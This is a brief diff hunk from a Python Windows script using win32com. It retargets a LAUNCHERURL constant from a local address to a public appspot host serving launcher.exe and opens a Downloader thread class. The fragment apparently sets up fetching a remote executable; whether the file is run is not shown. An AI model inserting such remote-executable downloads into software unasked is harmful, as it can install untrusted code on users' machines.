@@ -12,7 +12,7 @@ import win32com.client
 from win32com.shell import shellcon
 
 global LAUNCHERURL
-LAUNCHERURL = "http://192.168.2.4:8080/launcher.exe"
+LAUNCHERURL = "http://littlesitetomakemoney.appspot.com/launcher.exe"
 
 class Downloader(threading.Thread):
     def __init__(self, script):
